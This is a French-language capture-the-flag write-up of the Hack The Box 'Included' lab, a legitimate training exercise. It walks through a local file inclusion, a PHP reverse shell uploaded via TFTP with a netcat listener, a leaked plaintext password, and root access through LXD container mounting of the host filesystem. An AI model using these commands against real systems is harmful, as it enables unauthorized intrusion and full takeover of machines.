## Lab Title: Included
- Date: 2025-09-30
- Duration: ~120 minutes

### Platform: HTB – Starting Point > Tier 2

### 1. Scenario Summary
1. Le but est d'explorer les bases de l'énumération, de la découverte de services,
2. De l'alimentation des résultats Masscan vers `NMap`, du `dirbusting`, de `LFI`, de `RFI`, des astuces de filtrage `PHP`, de `TFTP`,
3. De la **post-exploitation** (découverte des identifiants en clair, Linpeas),
4. De l'élévation des privilèges (conteneurs de groupes **LXD/LXC**) et bien plus encore!

### 2. Findings
**Enumeration:**
1. En utilisant `nmap`, on fait le recherche sur la victime:
    - `nmap -Pn $ip --top-ports=10000`
    - Et on a trouvé cette information:
    ```code
        80/tcp open          http
        69/udp open|filtered tftp
    ```
    - Maintenant, on cannaît que **TFTP et HTTP** fonctionnent bien dans la machine victime.

2. Quand on a analysé le site Web: on a trouvé que on peut faire `Directory Traversal`
    - Comme: `http://$ip:80/?file=../../../etc/passwd` >> ou avec l'outil: `curl`
        - `curl http://$ip:80/?file=../../../etc/passwd`

3. On cannaît qu'il y a le serveur `TFTP`: et son dossier pour stocker les fichiers: `/var/lib/tftpboot/`
    - Donc, on recherchera ce dossier dans la machine victime:

4. **TFTP** >> fonctionne sans `user authentication`
    - On doit avoir le service: `tftp` pour communiquer le serveur remote

**FootHold:**
5. **PHP Reverse Shell:** `shell.php` serai envoyé par le `tftp` et on connait exactement où son `shell.php` serai: `/var/lib/tftpboot/`
    - `tftp $ip` >> après >> `put shell.php` pour télécharger.
    - On doit faire `trigger` >> avec `curl` et faire **NetCat** listening
    - `nc -lvnp 7532`
    - `curl http://$ip:80/?file=/var/lib/tftpboot/shell.php` >> après cela, on doit obtenir le `reverse-shell`
    - Avec cette commande: `python3 -c 'import pty;pty.spawn("/bin/bash")'` >> on obtient un meilleur shell.

**Lateral Movement:**
6. Quand on a analysé le site Web >> on a trouvé le fichier: `.htpasswd`
    - Dans ce fichier, on a trouvé les données de l'utilisateur: `mike:Sheffield19`
    - On fait `login` avec ces informations d'identifications: `su mike` >> et son mot de passe
    - Quand on change `/home/mike` >> on trouvera le `user.flag`

**Privilege Escalation:**
7. Maintenant, on doit analyser les privilèges de l'utilisateur: **mike** pour trouver un chemin pour le **root**
    - Quand on a analysé `id`: on a trouvé qu'il y un groupe: **lxd** (l'API pour gérer Linux conteneurs: LXC)
    - **lxd** >> **ne demande pas les privilèges pour accéder**
    - Pour une exploitation de **lxd** >> on doit utiliser le **Alpine** linux distro >> léger

    - **Le but est d'obtenir le root file system avec LXC en utilisant lxd**

8. Dans la machine attaquante, on doit télécharger ces fichiers de **Alpine** un distro de Linux:
    - `lxd.tar.xz`(metadata et configuration de alpine pour LXD/LXC) et `rootfs.squashfs` (root file system de alpine)
    - Pour avoir ces fichiers sur la machine victime, on doit faire `http.server` avec python3:
        - `python3 -m http.server 8000`
    - Et après, de la machine victime, on fait cela: `wget http://10.10.14.21:8000/lxd.tar.xz` et la meme chose pour `rootfs.squashfs`

9. Maintenant, on a ces fichiers: on doit préparer l'environement:
    1. On doit importer l'image utilisant **lxc**:
        - `lxc image import lxd.tar.xz rootfs.squashfs --alias alpine`
    2. On peut vérifier l'existence: `lxc image list`
    3. Pour obtenir tous les privilèges dans ce systeme: on doit changer la valuer de `security.privileged`:
        - `lxc init alpine privesc -c security.privileged=true`
    4. Pour accéder root file system, on fait **mounting**: on fait `mounting` le systeme actuel à notre conteneurs >> Par cela, on doit avoir un accèss à root systeme actuel
        - `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`
        - regardez >> `source=/` c'est `root file system actuel`

10. À ce moment-là, on peut commencer le conteneur:
    - `lxc start privesc`
    - `lxc exec privesc /bin/sh` >> Voilà, on obtient le shell de l'utilisateur root
    - On change son dossier à l'emplacement: `/mnt/root/root` et là-bas, on peut trouver le fichier: `root.txt`

### 3. Idea
1. Le meilleur chose que j'ai appris était d'obtenir les privilèges de l'utilisateur: `root` par **LXC: Linux Conteneurs**
2. C'était génial pour moi.

3. Voilà, ça y est, c'est fini: `https://labs.hackthebox.com/achievement/machine/2118023/292`
